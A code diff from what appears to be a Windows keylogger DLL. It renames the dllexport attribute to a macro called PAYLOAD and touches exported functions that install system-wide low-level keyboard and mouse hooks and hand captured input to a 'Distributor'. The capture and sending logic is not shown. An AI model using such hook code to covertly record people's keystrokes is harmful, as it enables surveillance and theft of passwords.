@@ -5,8 +5,9 @@
 
 #include "Keylogger.h"
 
-
 #include <Windows.h>
+
+# define PAYLOAD __declspec(dllexport)
 
 HHOOK g_hKeyboardHook;
 HHOOK g_hMouseHook;
@@ -57,24 +58,24 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 	return (CallNextHookEx(g_hMouseHook, nCode, wParam, lParam));
 }
 
-extern "C" __declspec(dllexport) void CreateKeyboardHook(void)
+extern "C" PAYLOAD void CreateKeyboardHook(void)
 {
 	g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, g_hInstance, NULL);
 	g_hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, g_hInstance, NULL); // ok without LL
 }
 
-extern "C" __declspec(dllexport) void DeleteKeyboardHook(void)
+extern "C" PAYLOAD void DeleteKeyboardHook(void)
 {
 	UnhookWindowsHookEx(g_hKeyboardHook);
 	UnhookWindowsHookEx(g_hMouseHook);
 }
 
-extern "C" __declspec(dllexport) void SetApplicationPath(std::string const& appliPath)
+extern "C" PAYLOAD void SetApplicationPath(std::string const& appliPath)
 {
 	g_ppgt.setApplicationPath(appliPath);
 }
 
-extern "C" __declspec(dllexport) void SetDistributor(std::shared_ptr<Distributor> ptr)
+extern "C" PAYLOAD void SetDistributor(std::shared_ptr<Distributor> ptr)
 {
 	g_keylogger.setDistributor(ptr);
 }
